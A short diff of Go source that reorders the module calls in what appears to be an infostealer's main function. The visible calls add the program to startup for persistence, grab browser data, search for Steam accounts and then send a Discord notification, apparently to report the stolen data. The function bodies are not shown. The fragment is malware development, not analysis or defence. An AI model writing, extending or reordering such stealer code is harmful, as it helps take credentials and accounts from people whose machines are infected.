@@ -38,11 +38,11 @@ func main() {
 	if strings.Contains(modulesEnabled, "startup") {
 		_ = AddToStartup()
 	}
-	if strings.Contains(modulesEnabled, "steam") {
-		_ = FindSteamAccounts()
-	}
 	if strings.Contains(modulesEnabled, "browsers") {
 		GrabBrowsersData()
+	}
+	if strings.Contains(modulesEnabled, "steam") {
+		_ = FindSteamAccounts()
 	}
 	_ = SendDiscordNotification()
 }
